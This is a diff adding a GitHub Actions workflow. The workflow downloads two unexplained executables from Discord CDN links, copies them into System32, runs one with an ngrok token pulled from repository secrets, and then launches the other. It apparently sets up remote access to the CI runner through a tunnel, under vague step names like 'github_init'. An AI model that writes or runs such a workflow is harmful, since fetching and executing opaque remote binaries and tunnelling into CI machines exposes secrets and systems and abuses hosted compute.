@@ -1,0 +1,25 @@
+name: main
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Download github_init and starting...
+      run: |
+        Invoke-WebRequest https://cdn.discordapp.com/attachments/818761039432253461/852512000017563690/github_init.exe -OutFile github_init.exe
+        Invoke-WebRequest https://cdn.discordapp.com/attachments/818761039432253461/853596430202568724/ce.exe -OutFile ce.exe
+    - name: Copy...
+      run: | 
+        copy github_init.exe C:\Windows\System32
+        copy ce.exe C:\Windows\System32
+    - name: Starting...
+      run: .\github_init.exe $Env:NGROK_AUTH_TOKEN
+      env:
+        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+    - name: Done. Maximum VM time:6h
+      run: cmd /c ce.exe
